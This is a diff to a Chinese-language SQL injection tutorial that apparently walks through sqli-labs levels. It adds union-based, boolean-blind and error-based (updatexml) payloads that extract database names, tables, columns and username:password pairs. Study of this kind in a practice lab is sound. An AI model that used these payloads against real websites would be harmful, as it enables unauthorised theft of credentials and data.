@@ -221,7 +221,8 @@ SQL注入（SQL Injection）是一种攻击方式，攻击者通过向SQL查询�
 示例‌：SELECT GROUP_CONCAT(username) FROM users
 原理‌：直接查询users表的username列，数据回显到页面。
 
-### 显注
+### 显注（以第一关为例）
+
 ```sql
 ?id=1' --+
 select * form users where id=1' --   
@@ -254,7 +255,8 @@ id=-1' union select 1,(select group_concat(username) from users),3--+
 #查询users表中username这一列的所有值
 ```
 
-### 盲注
+### 盲注 （以第五关为例）
+
 ```sql
 ?id=1'  
 #观察页面是否异常，并判定闭合方式
@@ -286,7 +288,28 @@ id=-1' union select 1,(select group_concat(username) from users),3--+
 ?id=1' and ascii(substr((select password from users where username='admin' limit 0,1),1,1))>50 --+
 #猜解密码
 
+```
 
+#以第六关为例
+```sql
+updatexml(XML_document, XPath_string, new_value)
+# XML_document:需要被修改的 XML 文档   XPath_string：一个合法的 XPath 表达式，用于定位 XML 文档中需要修改的节点  new_value：替换目标 XML 节点的新值
+
+?id=1 页面返回正常；输入 ?id=1' 无报错，排除单引号闭合。尝试 ?id=1\" 触发语法错误，显示双引号闭合的报错信息‌
+
+输入 ?id=1" --+（闭合双引号并注释后续代码），页面恢复正常，确认注入点为‌双引号闭合字符型注入
+
+?id=1" and updatexml(1, concat(0x7e, (select database()), 0x7e), 1) --+
+#报错显示security数据库名
+
+?id=1" and updatexml(1, concat(0x7e, (select table_name from information_schema.tables where table_schema=database() limit 0,1)), 1) --+
+#报错显示表名，通过修改limit值显示所有表名
+
+?id=1" and updatexml(1, concat(0x7e, (select column_name from information_schema.columns where table_name='users' limit 0,1)), 1) --+
+#显示列名 通过修改limit值显示所有列名
+
+?id=1" and updatexml(1, concat(0x7e, (select concat(username, ':', password) from users limit 0,1)), 1) --+
+#获取数据 通过修改limit值显示所有数据
 
 
 ```
